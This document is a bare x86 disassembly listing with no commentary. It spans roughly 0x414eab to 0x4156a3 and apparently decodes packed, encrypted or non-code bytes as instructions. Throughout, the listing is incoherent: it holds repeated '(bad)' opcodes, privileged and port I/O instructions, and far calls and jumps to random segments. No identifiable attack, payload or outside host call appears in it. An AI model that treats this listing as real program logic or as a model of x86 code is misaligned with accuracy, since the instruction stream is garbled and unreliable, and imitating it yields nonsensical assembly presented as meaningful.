  414eab:	mov    dh,0x5f
  414ead:	out    dx,eax
  414eae:	cmp    al,0x7d
  414eb0:	add    dh,ch
  414eb2:	mov    edi,0x1040a26f
  414eb7:	std    
  414eb8:	jg     0x414ef7
  414eba:	cmp    esi,DWORD PTR [esi+esi*8]
  414ebd:	mov    eax,0x663d5a9b
  414ec2:	dec    esi
  414ec3:	call   0x9582:0x5d72a972
  414eca:	mov    dh,0xc
  414ecc:	lahf   
  414ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ece:	test   eax,0xe302c17e
  414ed3:	sub    bh,0x5d
  414ed6:	out    dx,eax
  414ed7:	dec    esp
  414ed8:	push   es
  414ed9:	push   edi
  414eda:	mov    ebp,0xcbc3bc6e
  414edf:	scas   eax,DWORD PTR es:[edi]
  414ee0:	mov    ah,0xdc
  414ee2:	fs mov edi,0xeb2d011e
  414ee8:	ja     0x414eaa
  414eea:	push   ecx
  414eeb:	int    0xfa
  414eed:	fwait
  414eee:	enter  0x3564,0xfb
  414ef2:	dec    edi
  414ef3:	cs das 
  414ef5:	std    
  414ef6:	sbb    ah,dl
  414ef8:	cmp    DWORD PTR [edi-0x54d505dd],ebx
  414efe:	dec    ebp
  414eff:	in     eax,dx
  414f00:	ret    
  414f01:	aam    0x23
  414f03:	aas    
  414f04:	dec    esp
  414f05:	mov    ds:0x44240807,al
  414f0a:	mov    edi,DWORD PTR [ebx]
  414f0c:	add    eax,0xd8b25b6c
  414f11:	xchg   edx,eax
  414f12:	sahf   
  414f13:	push   edi
  414f14:	sub    ebx,DWORD PTR [ebp+0x47]
  414f17:	sub    ch,dh
  414f19:	dec    esp
  414f1a:	add    esp,DWORD PTR ds:0x4c3b2b24
  414f20:	ud1    edi,esi
  414f23:	loopne 0x414f79
  414f25:	xor    BYTE PTR [ebx-0x486e7b93],dh
  414f2b:	mov    eax,ds:0xe8045d1c
  414f30:	xchg   si,ax
  414f32:	pop    edx
  414f33:	dec    esp
  414f34:	and    eax,0x4c967d2d
  414f39:	jbe    0x414f20
  414f3b:	jl     0x414ee7
  414f3d:	fnop   
  414f3f:	cwde   
  414f40:	mov    ebx,0x2c0a16ef
  414f45:	sbb    eax,0x84b0d460
  414f4a:	daa    
  414f4b:	ss dec ebx
  414f4d:	pushf  
  414f4e:	xor    bl,al
  414f50:	das    
  414f51:	push   cs
  414f52:	mov    eax,ds:0xf0dd48e7
  414f57:	shr    BYTE PTR [edi+0x256c5fe2],0x58
  414f5e:	xchg   ebx,eax
  414f5f:	mov    dl,0xb5
  414f62:	in     eax,dx
  414f63:	push   esp
  414f64:	lahf   
  414f65:	push   cs
  414f66:	repnz ins BYTE PTR es:[edi],dx
  414f68:	dec    ebx
  414f69:	cdq    
  414f6a:	xchg   esi,eax
  414f6b:	ror    esp,1
  414f6d:	and    esi,DWORD PTR [ecx+0x71]
  414f70:	pusha  
  414f71:	pop    edx
  414f72:	arpl   WORD PTR [esi],cx
  414f74:	neg    DWORD PTR [esi+0x4d]
  414f77:	jl     0x414fd7
  414f79:	xor    al,0x94
  414f7b:	mov    BYTE PTR [esp+edi*4-0x5e],cl
  414f7f:	sub    BYTE PTR [esi+0x817ed47],ch
  414f85:	adc    al,0xcd
  414f87:	(bad)  
  414f89:	imul   eax,edi,0xa881525a
  414f8f:	xor    DWORD PTR [eax+ebp*1],esi
  414f92:	retf   0xbd9c
  414f95:	mov    esi,0xa52270ef
  414f9a:	adc    BYTE PTR [ecx+esi*8+0x13],dl
  414f9e:	cmp    DWORD PTR [esi-0x23bfa151],ebx
  414fa4:	push   ebx
  414fa5:	ins    DWORD PTR es:[edi],dx
  414fa6:	push   0xeefbe75b
  414fab:	pop    ecx
  414fac:	retf   0x13cc
  414faf:	cmp    ebp,DWORD PTR [ebx-0x21]
  414fb2:	les    ebp,FWORD PTR ds:0x587306b6
  414fb8:	jmp    0x2979cac6
  414fbd:	cmp    al,0xbd
  414fbf:	test   BYTE PTR [edx-0x16a30d6b],dh
  414fc5:	xchg   ebx,eax
  414fc6:	int    0x5d
  414fc8:	jne    0x414f8b
  414fca:	scas   eax,DWORD PTR es:[edi]
  414fcb:	scas   eax,DWORD PTR es:[edi]
  414fcc:	dec    eax
  414fcd:	push   eax
  414fce:	inc    ebp
  414fcf:	test   DWORD PTR [esi+0x5a118dc3],ebp
  414fd5:	sub    BYTE PTR fs:[edx-0x6028ac6f],al
  414fdc:	sub    BYTE PTR [edx-0x4148f70f],cl
  414fe2:	jp     0x414fa9
  414fe4:	adc    esi,DWORD PTR [ebx]
  414fe6:	push   esi
  414fe7:	mov    ds:0xfda5ff8,al
  414fec:	xchg   edi,eax
  414fed:	mov    ebx,DWORD PTR [ebp+0x38773583]
  414ff3:	dec    esi
  414ff4:	push   0xfffffff3
  414ff6:	mov    ecx,0x664f490f
  414ffb:	and    DWORD PTR [ebx],ebp
  414ffd:	add    BYTE PTR [ebx+0x46ef1d16],dh
  415003:	ret    0xff11
  415006:	popf   
  415007:	in     al,dx
  415008:	bound  ebx,QWORD PTR [edx+0x76eccac3]
  41500e:	popf   
  41500f:	iret   
  415010:	mov    cl,0x64
  415012:	mov    es,WORD PTR ds:0x3cf357a3
  415018:	inc    esp
  415019:	xchg   ecx,eax
  41501a:	in     eax,dx
  41501b:	jmp    0x67:0x968dd0c8
  415022:	or     al,BYTE PTR [edx-0x51fec1f5]
  415028:	add    DWORD PTR [edx+0x26f193a8],ecx
  41502e:	inc    ebx
  41502f:	ss xchg ecx,eax
  415031:	aad    0xa0
  415033:	push   0xffffff94
  415035:	mov    ch,0x1c
  415037:	sbb    DWORD PTR [ebx-0x4bca8794],edx
  41503d:	int    0xb2
  41503f:	mov    WORD PTR [eax-0x28d8c9e3],fs
  415045:	or     cl,BYTE PTR [eax-0x8043222]
  41504b:	std    
  41504c:	jbe    0x415030
  41504e:	clc    
  41504f:	pop    eax
  415050:	iret   
  415051:	xor    al,0x79
  415053:	shl    DWORD PTR [edi],0xe4
  415056:	adc    DWORD PTR ds:0x4e0f50c7,edx
  41505c:	sub    al,0x16
  41505e:	pop    ecx
  41505f:	and    DWORD PTR [ebx+0x78e9150],ecx
  415065:	(bad)  
  415066:	lds    ecx,FWORD PTR [edx-0x2c0589c2]
  41506c:	test   BYTE PTR [eax],ch
  41506e:	and    eax,0x5c485f95
  415073:	pop    es
  415074:	cli    
  415075:	std    
  415076:	cmp    bl,BYTE PTR [esi]
  415078:	xchg   esi,eax
  415079:	cld    
  41507a:	(bad)  
  41507b:	dec    eax
  41507c:	pop    esp
  41507d:	cmp    ch,BYTE PTR [ebx+0x95948a]
  415083:	fistp  QWORD PTR [edx]
  415085:	push   esi
  415086:	inc    esi
  415087:	dec    ebx
  415088:	cmp    edx,DWORD PTR [edx+0x2fbe348]
  41508e:	lahf   
  41508f:	dec    ebx
  415090:	rsm    
  415092:	idiv   edi
  415094:	rol    edx,1
  415096:	mov    ebx,0x257715e6
  41509b:	cmp    DWORD PTR [edx+0xf],ebp
  41509e:	mov    ebx,0x9764e91b
  4150a3:	cmp    cl,ah
  4150a5:	je     0x415043
  4150a7:	xchg   ebx,eax
  4150a8:	ins    BYTE PTR es:[edi],dx
  4150a9:	lea    ecx,[eax-0x6b]
  4150ac:	sar    DWORD PTR [edi+0x19],1
  4150af:	call   0x79e8:0xe0847276
  4150b6:	and    BYTE PTR [ecx+0x46],dl
  4150b9:	cld    
  4150ba:	js     0x41510b
  4150bc:	inc    edi
  4150bd:	enter  0x84c0,0x25
  4150c1:	lds    esp,FWORD PTR [edx+0x163be40c]
  4150c7:	push   ebp
  4150c8:	mov    ebx,DWORD PTR [esi]
  4150ca:	push   ss
  4150cb:	ror    BYTE PTR ds:0x45db9f2f,cl
  4150d1:	mov    edx,0xdea3aa8c
  4150d6:	xlat   BYTE PTR ds:[ebx]
  4150d7:	xchg   DWORD PTR [ebp+0x71],esi
  4150da:	stos   DWORD PTR es:[edi],eax
  4150db:	mov    cl,0xc3
  4150dd:	push   ss
  4150de:	rcl    BYTE PTR [ecx+eax*8-0x19e1eeea],1
  4150e5:	js     0x41513e
  4150e7:	outs   dx,BYTE PTR ds:[esi]
  4150e8:	out    dx,al
  4150e9:	push   bx
  4150eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ec:	lahf   
  4150ed:	xchg   DWORD PTR [edx],ebx
  4150ef:	loope  0x41510a
  4150f1:	adc    bh,bh
  4150f3:	jb     0x4150b2
  4150f5:	stos   DWORD PTR es:[edi],eax
  4150f6:	ficomp DWORD PTR [esi]
  4150f8:	fdiv   QWORD PTR ds:0x9ed49112
  4150fe:	in     eax,0x9c
  415100:	sahf   
  415101:	fs sahf 
  415103:	leave  
  415104:	pop    ds
  415105:	cmp    bh,dl
  415107:	sub    ebp,DWORD PTR ds:0x95d8a27f
  41510d:	dec    DWORD PTR [ebx-0x3f]
  415110:	or     ah,BYTE PTR [edi+0x9ccf84a]
  415116:	or     DWORD PTR [ebx],ecx
  415118:	sbb    DWORD PTR [edi+0x459bd107],0xc5b048d1
  415122:	mov    BYTE PTR [edx-0x40],0x5c
  415126:	daa    
  415127:	sub    dh,bl
  415129:	dec    esp
  41512a:	mov    ch,0xd9
  41512c:	repnz or esp,eax
  41512f:	mov    ds:0x6440f4c,eax
  415134:	fucomip st,st(0)
  415136:	jbe    0x415168
  415138:	in     eax,dx
  415139:	loope  0x41514c
  41513b:	add    BYTE PTR [eax+0x60],cl
  41513e:	(bad)  
  41513f:	mov    edi,0xdd6544bd
  415144:	jecxz  0x41512a
  415146:	jae    0x415105
  415148:	retf   0x7382
  41514b:	iret   
  41514c:	xchg   BYTE PTR [edi],al
  41514e:	mov    dl,dh
  415150:	sub    eax,0x331f7129
  415155:	retw   0xbd8a
  415159:	imul   esp,eax,0x52
  41515c:	pusha  
  41515d:	pop    ss
  41515e:	loopne 0x415151
  415160:	arpl   WORD PTR [esi-0x200a6393],sp
  415166:	nop
  415167:	lea    edx,[edx+0x7b]
  41516a:	inc    ebp
  41516b:	jmp    0x415166
  41516d:	and    al,0x8a
  41516f:	cmp    BYTE PTR [eax],dl
  415171:	call   0x58dd:0xe6d34ea3
  415178:	xchg   edx,edi
  41517a:	inc    eax
  41517b:	ror    BYTE PTR [edx-0x62],cl
  41517e:	test   eax,0xe640edf8
  415183:	and    eax,0xf9487ac4
  415188:	push   ebx
  415189:	inc    ebp
  41518a:	pop    ds
  41518b:	ror    BYTE PTR [ecx+0x3e],0xf9
  41518f:	mov    esi,0xea62fed2
  415194:	outs   dx,BYTE PTR ds:[esi]
  415195:	add    esp,DWORD PTR [edx+esi*4-0x5b]
  415199:	das    
  41519a:	adc    eax,0xb54b2a84
  41519f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151a0:	or     eax,0x7fc69491
  4151a5:	call   0xd26f:0x93e2f0e0
  4151ac:	lods   eax,DWORD PTR ds:[esi]
  4151ad:	jg     0x415174
  4151af:	leave  
  4151b0:	es retf 
  4151b2:	xchg   ecx,eax
  4151b3:	iret   
  4151b4:	cmp    cl,BYTE PTR [esi]
  4151b6:	(bad)  
  4151b7:	data16 fst DWORD PTR [esi]
  4151ba:	fs fs nop
  4151bd:	vpminsw ymm5,ymm6,YMMWORD PTR [ebx]
  4151c1:	sub    DWORD PTR [ebx-0x1a],eax
  4151c4:	loope  0x4151e9
  4151c6:	in     al,dx
  4151c7:	pop    ebx
  4151c8:	std    
  4151c9:	pop    esp
  4151ca:	lods   al,BYTE PTR ds:[esi]
  4151cb:	jmp    0x41524b
  4151cd:	or     DWORD PTR [esi-0x29463321],ebp
  4151d3:	adc    edx,edi
  4151d5:	lea    esi,[ecx+0x52]
  4151d8:	jne    0x41522c
  4151da:	fsubr  st,st(4)
  4151dc:	dec    ebp
  4151dd:	aad    0xd9
  4151df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e0:	and    ebp,esi
  4151e2:	(bad)  
  4151e3:	repnz sahf 
  4151e5:	pop    ss
  4151e6:	(bad)  
  4151e7:	sbb    BYTE PTR [ebp-0xddf8b8b],dl
  4151ed:	dec    ebx
  4151ee:	pop    esi
  4151ef:	les    eax,FWORD PTR [ecx]
  4151f1:	sti    
  4151f2:	push   ss
  4151f3:	mov    ds:0x1b2d1cd1,eax
  4151f8:	cs pop ebp
  4151fa:	out    0x11,eax
  4151fc:	cmp    al,dl
  4151fe:	sbb    al,0x0
  415200:	test   DWORD PTR [edx-0x717ca67e],0xd84ebb45
  41520a:	dec    edx
  41520b:	aad    0xf4
  41520d:	ret    
  41520e:	push   cs
  41520f:	and    eax,0x477bc7b9
  415214:	bound  edx,QWORD PTR [ecx]
  415216:	jg     0x41526f
  415218:	mov    bh,0x64
  41521a:	push   eax
  41521b:	outs   dx,BYTE PTR ds:[esi]
  41521c:	mov    DWORD PTR [esi],eax
  41521e:	aad    0x9f
  415220:	dec    esp
  415221:	icebp  
  415222:	out    0x80,al
  415224:	ret    
  415225:	dec    ecx
  415226:	jle    0x4151a9
  415228:	in     eax,dx
  415229:	pushf  
  41522a:	out    0x31,al
  41522c:	dec    edx
  41522d:	jl     0x415221
  41522f:	aam    0xcf
  415231:	jbe    0x4151d5
  415233:	and    edx,DWORD PTR [ebp-0x30]
  415236:	rol    ah,cl
  415238:	mov    bl,0x12
  41523a:	push   edi
  41523b:	ja     0x415216
  41523d:	add    bh,bl
  41523f:	rcl    DWORD PTR [ebx-0x4],cl
  415242:	sub    eax,0x7a10f5da
  415247:	mov    dl,0x8d
  415249:	mov    ds:0x47d88fc2,eax
  41524e:	and    DWORD PTR [eax],0x56cd8dfc
  415254:	sub    BYTE PTR ds:0xf1af3706,0x28
  41525b:	fwait
  41525c:	push   edi
  41525d:	(bad)  
  41525e:	mov    cs,WORD PTR [edi-0x18]
  415261:	add    bh,BYTE PTR [edi-0x3fe2851c]
  415267:	pop    eax
  415268:	inc    edi
  415269:	cs test al,0xda
  41526c:	imul   ebp,DWORD PTR [ebx],0xfe82c071
  415272:	leave  
  415273:	out    0xc6,al
  415275:	jmp    0x415278
  415277:	pop    esi
  415278:	mov    al,ds:0x8c11dd2b
  41527d:	(bad)  
  41527e:	jmp    0xb6232a9b
  415283:	mov    bl,0xb4
  415285:	lods   al,BYTE PTR ds:[esi]
  415286:	in     al,dx
  415287:	sub    al,0xe4
  415289:	mov    WORD PTR [edx],?
  41528b:	das    
  41528c:	loop   0x4152f0
  41528e:	mov    BYTE PTR [ebx+0x60],ah
  415291:	cmc    
  415292:	sar    BYTE PTR [ebp-0x5b],0xc4
  415296:	push   ds
  415297:	xor    ch,dl
  415299:	std    
  41529a:	mov    ch,0xbf
  41529c:	sub    eax,0xa381f3d0
  4152a1:	mov    DWORD PTR [eax+0x49e487e8],esi
  4152a7:	inc    ebp
  4152a8:	mov    ?,WORD PTR [edi]
  4152aa:	jnp    0x4152b4
  4152ac:	adc    DWORD PTR ds:0xd727da31,eax
  4152b2:	ja     0x415328
  4152b4:	push   eax
  4152b5:	fimul  DWORD PTR [esi+0x6a7a9fab]
  4152bb:	xchg   edx,eax
  4152bc:	leave  
  4152bd:	test   al,0x82
  4152bf:	lds    ebp,FWORD PTR [edx-0x3815aaa5]
  4152c5:	mov    bl,0xf7
  4152c7:	cmc    
  4152c8:	adc    ch,bl
  4152ca:	ror    BYTE PTR [ebx+0x4358f924],cl
  4152d0:	xchg   edi,eax
  4152d1:	lds    ebp,FWORD PTR [edx]
  4152d3:	inc    edx
  4152d4:	(bad)
  4152d9:	xor    dl,bh
  4152db:	mov    edx,0xb9140333
  4152e0:	cmp    DWORD PTR [edi],edi
  4152e2:	jb     0x415325
  4152e4:	rcr    BYTE PTR ds:[eax+0x6d],cl
  4152e8:	ss aaa 
  4152ea:	add    edi,DWORD PTR [eax]
  4152ec:	adc    cl,ch
  4152ee:	xlat   BYTE PTR ds:[ebx]
  4152ef:	fwait
  4152f0:	xor    DWORD PTR [ebx],esi
  4152f2:	sub    cl,BYTE PTR [esi-0x534c9a2f]
  4152f8:	inc    esi
  4152fa:	gs mov dh,0x6a
  4152fd:	push   ebp
  4152fe:	stos   DWORD PTR es:[edi],eax
  4152ff:	lea    edx,[edi-0x505b21a3]
  415305:	or     al,0xa4
  415307:	(bad)  
  415308:	mov    eax,0x87b5eaef
  41530d:	jne    0x41529b
  41530f:	fcomp  DWORD PTR [eax+0x3f]
  415312:	xor    edx,DWORD PTR [eax+eax*4+0x1353740b]
  415319:	add    edx,ecx
  41531b:	inc    ebx
  41531c:	aad    0xa5
  41531e:	mov    ds:0x52a6f70a,eax
  415323:	fld    QWORD PTR [ebx-0x5e]
  415326:	inc    eax
  415327:	add    al,0x82
  415329:	push   edi
  41532a:	xor    DWORD PTR [esi+ebp*8-0x73],0x72
  41532f:	ins    BYTE PTR es:[edi],dx
  415330:	in     al,0xeb
  415332:	add    eax,0x5f306f31
  415337:	or     esp,DWORD PTR [esi-0x11]
  41533a:	and    ebp,DWORD PTR [edi]
  41533c:	pusha  
  41533d:	dec    edi
  41533e:	bound  ebp,QWORD PTR [eax+0x33c8d359]
  415344:	test   BYTE PTR [edx-0x7c],bl
  415347:	and    al,0x8c
  415349:	(bad)  
  41534a:	(bad)  [ebx+0x5f14601c]
  415350:	inc    ebp
  415351:	rol    BYTE PTR [ebx+0x3cb75eed],0x36
  415358:	sub    bl,bh
  41535a:	or     ah,BYTE PTR [ecx+eax*4-0x1a69b30d]
  415361:	pop    es
  415362:	cs dec edx
  415364:	cdq    
  415365:	das    
  415366:	sar    BYTE PTR [edx-0x7b8d6fe6],1
  41536c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41536d:	fwait
  41536e:	mov    cl,0x4a
  415370:	jge    0x41533b
  415372:	inc    edi
  415373:	xor    DWORD PTR [ebx],esp
  415375:	sub    al,0x25
  415377:	push   edi
  415378:	pop    ss
  415379:	mov    ebx,0x6515a3f
  41537e:	leave  
  41537f:	jne    0x4153d4
  415381:	in     al,dx
  415382:	sub    BYTE PTR [eax-0x77],bl
  415385:	mov    al,BYTE PTR [edx+0x12bbed9a]
  41538b:	or     ecx,DWORD PTR [ecx]
  41538d:	and    al,0xd5
  41538f:	(bad)  
  415390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415391:	int    0xd
  415393:	and    esp,DWORD PTR [eax]
  415395:	push   esp
  415396:	push   edi
  415397:	adc    ecx,DWORD PTR [ebp+0x28]
  41539a:	jmp    0x15cc:0xacbfaa65
  4153a1:	mov    esi,0x3d34356d
  4153a6:	cmp    eax,DWORD PTR [ebx+0x20e67e7c]
  4153ac:	pop    ecx
  4153ad:	loop   0x41534c
  4153af:	dec    esp
  4153b0:	mov    edi,0x76ae65e4
  4153b5:	addr16 jmp 0x4153e5
  4153b8:	pop    ebx
  4153b9:	(bad)  
  4153ba:	lods   eax,DWORD PTR ds:[esi]
  4153bb:	cmc    
  4153bc:	(bad)  
  4153bd:	and    BYTE PTR [eax],dl
  4153bf:	inc    esp
  4153c0:	xor    BYTE PTR [ebx],al
  4153c2:	fwait
  4153c3:	jb     0x415427
  4153c5:	hlt    
  4153c6:	ret    
  4153c7:	dec    ebx
  4153c8:	imul   ebp,DWORD PTR [edx],0x3e
  4153cb:	inc    BYTE PTR [esi]
  4153cd:	into   
  4153ce:	xchg   bx,dx
  4153d1:	enter  0xa997,0x60
  4153d5:	pop    ds
  4153d6:	pop    ss
  4153d7:	inc    esp
  4153d8:	adc    eax,0x20943c44
  4153dd:	mov    bh,0x80
  4153df:	call   0x11a289d9
  4153e4:	imul   DWORD PTR [eax]
  4153e6:	jmp    0x4153b6
  4153e8:	fadd   DWORD PTR [edx]
  4153ea:	dec    edi
  4153eb:	mov    cl,0x1d
  4153ed:	adc    eax,0x3b7c85f7
  4153f2:	pop    ebp
  4153f3:	cld    
  4153f4:	push   0xb90e0eff
  4153f9:	(bad)  
  4153fa:	and    edi,ebx
  4153fc:	cmp    edx,DWORD PTR [ecx]
  4153fe:	shl    DWORD PTR [ecx-0xa],cl
  415401:	xchg   edx,eax
  415402:	jmp    0x64caf25d
  415407:	nop
  415408:	fld    QWORD PTR [eax+0x3f]
  41540b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41540c:	jg     0x415474
  41540e:	popa   
  41540f:	cmp    dl,ch
  415411:	cmp    edx,esi
  415413:	push   0x6cc40348
  415418:	jno    0x41547b
  41541a:	dec    esi
  41541b:	(bad)  
  41541c:	into   
  41541d:	mov    esi,0x3482e20f
  415422:	fwait
  415423:	xchg   ebx,eax
  415424:	cwde   
  415425:	inc    esp
  415426:	add    bl,bh
  415428:	xor    edx,DWORD PTR [esp+ecx*2+0x3c9fe60e]
  41542f:	mov    eax,0xe7db44c4
  415434:	iret   
  415435:	fdivr  DWORD PTR [ebx+0x36f1f8c7]
  41543b:	fmul   st(0),st
  41543d:	mov    DWORD PTR [ebp+0x533811f5],ebp
  415443:	jns    0x4153df
  415445:	mov    dh,0x48
  415447:	ror    DWORD PTR [ecx],0x63
  41544a:	xchg   ebx,eax
  41544b:	adc    eax,0x4afc70b3
  415450:	add    dh,bl
  415452:	add    al,0x73
  415454:	jno    0x41540a
  415456:	frstor [esi]
  415458:	add    al,0xe
  41545a:	(bad)  
  41545b:	je     0x41542c
  41545d:	adc    eax,0x795bbbdc
  415462:	adc    al,0x59
  415464:	stc    
  415465:	lds    ebp,FWORD PTR [edx+0x25]
  415468:	les    edi,FWORD PTR [eax]
  41546a:	jl     0x415491
  41546c:	out    dx,al
  41546d:	push   ebx
  41546e:	and    BYTE PTR [edx],dh
  415470:	push   esi
  415471:	add    eax,0x64b34ce1
  415476:	inc    esp
  415477:	imul   eax,ebp,0x8364857c
  41547d:	cmovb  esp,edi
  415480:	aad    0x54
  415482:	dec    edx
  415483:	push   esi
  415484:	add    DWORD PTR [ebp+0x472e70fc],edi
  41548a:	and    ch,BYTE PTR [ebx]
  41548c:	inc    eax
  41548d:	ss neg BYTE PTR fs:[edx+edi*8+0x3884ef11]
  415496:	in     al,0xd
  415498:	(bad)  
  415499:	(bad)  
  41549a:	scas   eax,DWORD PTR es:[edi]
  41549b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41549c:	sbb    esi,DWORD PTR [eax+0x28e5d583]
  4154a2:	adc    al,0x75
  4154a4:	hlt    
  4154a5:	inc    edi
  4154a6:	xchg   edx,eax
  4154a7:	idiv   BYTE PTR [edx]
  4154a9:	sub    dl,BYTE PTR [esp-0xbf1ea99]
  4154b0:	test   dl,ch
  4154b2:	jle    0x415474
  4154b4:	jge    0x415478
  4154b6:	adc    BYTE PTR [eax],cl
  4154b8:	addr16 inc ebp
  4154ba:	loope  0x4154f1
  4154bc:	ins    BYTE PTR es:[edi],dx
  4154bd:	loop   0x41545f
  4154bf:	lds    esp,FWORD PTR [edx-0x3b]
  4154c2:	xor    BYTE PTR [esi-0x16],ch
  4154c5:	(bad)  
  4154c6:	cld    
  4154c7:	adc    BYTE PTR [edx-0x15],al
  4154ca:	nop
  4154cb:	sahf   
  4154cc:	mov    DWORD PTR ds:0x1845d17,edi
  4154d2:	inc    esp
  4154d3:	and    al,0xf6
  4154d5:	jo     0x4154d5
  4154d7:	or     al,BYTE PTR [ecx+0x1ae3abdc]
  4154dd:	test   DWORD PTR [esi+esi*2+0x77],edi
  4154e1:	xchg   BYTE PTR [edx+0x1a9508b],ch
  4154e7:	data16 shl BYTE PTR [esi+0x7c],0xf3
  4154ec:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4154ee:	or     eax,0x94434dc
  4154f3:	hlt    
  4154f4:	aaa    
  4154f5:	sti    
  4154f6:	mov    dh,0x65
  4154f8:	rol    ecx,1
  4154fa:	out    dx,eax
  4154fb:	push   edx
  4154fc:	or     ebp,DWORD PTR [eax+0x4efa16b0]
  415502:	cli    
  415503:	add    eax,0x3e464476
  415508:	ins    DWORD PTR es:[edi],dx
  415509:	shl    ah,0xa8
  41550c:	enter  0xb699,0x2d
  415510:	xor    eax,esi
  415512:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  415514:	xchg   ecx,eax
  415515:	or     eax,0x73449910
  41551a:	pop    ecx
  41551b:	lods   eax,DWORD PTR ds:[esi]
  41551c:	inc    edx
  41551d:	cmp    eax,0x8b3d3432
  415522:	push   0xc32ac08
  415527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415528:	and    al,BYTE PTR [edx-0x74]
  41552b:	mov    ch,0x1d
  41552d:	xchg   BYTE PTR [esi-0x13],ah
  415530:	pop    ebx
  415531:	mov    BYTE PTR [eax-0x2afeb6ff],ah
  415537:	mov    dl,0xd3
  415539:	push   ebx
  41553a:	stos   DWORD PTR es:[edi],eax
  41553b:	out    dx,eax
  41553c:	push   ebp
  41553d:	inc    ebp
  41553e:	rcr    bh,cl
  415540:	mov    bh,0xa4
  415542:	jg     0x41552c
  415544:	mov    dl,0xbe
  415546:	pop    ss
  415547:	mov    ds:0x9fad074b,eax
  41554c:	rcl    DWORD PTR [edi+0x60],0x6f
  415550:	jmp    0x4154f9
  415552:	repz push ecx
  415554:	jge    0x41551a
  415556:	out    0xbb,eax
  415558:	lock jae 0x41552a
  41555b:	cdq    
  41555c:	frstor [ebx+0x23973711]
  415562:	fistp  WORD PTR [esi-0x1d]
  415565:	inc    edi
  415566:	int    0x2
  415568:	mov    ebp,0xa219d768
  41556d:	rcr    DWORD PTR [edx+0x68],1
  415570:	aaa    
  415571:	(bad)  
  415572:	popf   
  415573:	mov    BYTE PTR [ebp-0x56],al
  415576:	(bad)  
  415577:	(bad)  
  415578:	pusha  
  415579:	mov    edx,0x98bad387
  41557e:	ret    
  41557f:	push   ebx
  415580:	adc    cl,ah
  415582:	xor    BYTE PTR [ebp-0x2f874430],ch
  415588:	mov    al,0x23
  41558a:	(bad)  
  41558b:	stos   DWORD PTR es:[di],eax
  41558d:	add    DWORD PTR [ebp-0x2623be6f],ebp
  415593:	xor    eax,0xbc4edff5
  415598:	mov    ah,0x5b
  41559a:	call   0x5f39:0x6d6bcc0e
  4155a1:	retf   0xb1a2
  4155a4:	(bad)
  4155a8:	cmp    al,0xb3
  4155aa:	into   
  4155ab:	xchg   ebx,eax
  4155ac:	ss sub eax,0x1610abe1
  4155b2:	push   edx
  4155b3:	js     0x41559f
  4155b5:	dec    esi
  4155b6:	shl    ebx,cl
  4155b8:	loopne 0x415595
  4155ba:	and    bh,bh
  4155bc:	mov    ecx,0xb1927083
  4155c1:	cmp    dh,al
  4155c3:	inc    edi
  4155c4:	adc    ebp,DWORD PTR [esp+esi*1]
  4155c7:	inc    eax
  4155c8:	xchg   DWORD PTR [ebx-0x1b],ebp
  4155cb:	je     0x41563b
  4155cd:	or     al,0x74
  4155cf:	push   0x53ae68b9
  4155d4:	cmp    ah,BYTE PTR [eax]
  4155d6:	aaa    
  4155d7:	into   
  4155d8:	adc    al,0xe
  4155da:	cwde   
  4155db:	pop    ebp
  4155dc:	ror    DWORD PTR ds:0x843af929,0x83
  4155e3:	mov    edi,0xcd908920
  4155e8:	sub    BYTE PTR [esi-0x4af11506],0xd
  4155ef:	(bad)  
  4155f0:	loope  0x415575
  4155f2:	stos   BYTE PTR es:[edi],al
  4155f3:	cmp    eax,0x347921da
  4155f8:	ja     0x415630
  4155fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155fb:	xchg   esp,eax
  4155fc:	bt     DWORD PTR ds:[edi+eiz*2-0x74],eax
  415602:	test   eax,0x4f186b65
  415607:	fild   QWORD PTR [edx-0x4de85515]
  41560d:	xchg   edx,eax
  41560e:	test   DWORD PTR [edx+edi*4+0x27],esi
  415612:	(bad)  
  415614:	inc    edi
  415615:	sbb    DWORD PTR ds:0xf0752a40,esi
  41561b:	sbb    ecx,edi
  41561d:	jo     0x415685
  41561f:	js     0x415642
  415621:	dec    ebx
  415622:	xchg   edx,eax
  415623:	cmp    DWORD PTR [ebp+0x7af343fa],0x65245a8e
  41562d:	add    BYTE PTR [ebp-0x725bb100],al
  415633:	(bad)  
  415634:	es cmp eax,0x584865ac
  41563a:	xchg   esi,eax
  41563b:	mov    bl,0xad
  41563d:	pop    es
  41563e:	loopne 0x415697
  415640:	dec    ecx
  415641:	pusha  
  415642:	push   eax
  415643:	push   0x157220
  415648:	dec    ecx
  415649:	shr    bl,cl
  41564b:	ret    0xbdb8
  41564e:	xor    bh,cl
  415650:	fs cmp al,0xe3
  415653:	(bad)  
  415654:	out    0x9,eax
  415656:	sub    al,0xd5
  415658:	jnp    0x4156cd
  41565a:	push   es
  41565b:	repnz adc bl,BYTE PTR [edi]
  41565e:	xchg   esi,eax
  41565f:	or     dl,ch
  415661:	daa    
  415662:	adc    esp,DWORD PTR [edx]
  415664:	push   ss
  415665:	adc    BYTE PTR [ebx],0x47
  415668:	add    ch,BYTE PTR [edi+0x2d564fc1]
  41566e:	dec    edx
  41566f:	jmp    0xa70372ef
  415674:	xchg   BYTE PTR [ecx-0x6a84050f],bh
  41567a:	pop    eax
  41567b:	sbb    eax,0xbc5c6383
  415680:	jmp    0xa59a:0x1e13d70d
  415687:	mov    ah,0x20
  415689:	mov    al,0xb0
  41568b:	ins    BYTE PTR es:[edi],dx
  41568c:	jne    0x4156c3
  41568e:	cmp    esi,DWORD PTR [edi-0x27]
  415691:	loop   0x4156a2
  415693:	jp     0x415661
  415695:	shl    ch,1
  415697:	(bad)  
  415698:	scas   eax,DWORD PTR es:[edi]
  415699:	stc    
  41569a:	jecxz  0x415638
  41569c:	adc    dl,BYTE PTR [esi-0x70]
  41569f:	mov    WORD PTR [esi],cs
  4156a1:	out    dx,al
  4156a2:	das    
  4156a3:	in     al,dx
